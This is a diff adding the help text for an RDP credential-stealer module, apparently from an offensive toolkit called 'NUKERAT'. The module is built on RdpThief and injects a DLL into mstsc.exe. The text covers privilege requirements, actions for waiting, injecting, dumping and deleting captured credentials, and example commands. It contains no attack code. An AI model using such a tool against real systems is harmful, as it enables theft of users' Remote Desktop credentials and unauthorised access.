@@ -1,0 +1,25 @@
+ABOUT
+    RDP credential stealer via reflective DLL injection into mstsc.exe. Must run in
+    the context of a privileged user or a user with SeImpersonatePrivilege. Built on
+    RdpThief and wrapped for .NET reflection loading.
+
+USAGE:
+    net-cheese-rdp --- [action]
+
+ARGUMENTS:
+    wait                Keep listening for new mstsc.exe processes (stop with Ctrl+C)
+    clean               Delete the credentials dump file if present
+    dump                Dump and parse credentials from the file if present
+    (no action)         Inject into an active mstsc.exe process (default wait 10 seconds)
+
+EXAMPLES:
+    net-cheese-rdp --- wait
+    net-cheese-rdp --- dump
+    net-cheese-rdp --- clean
+    net-cheese-rdp
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-cheese-rdp -w 60 --- wait
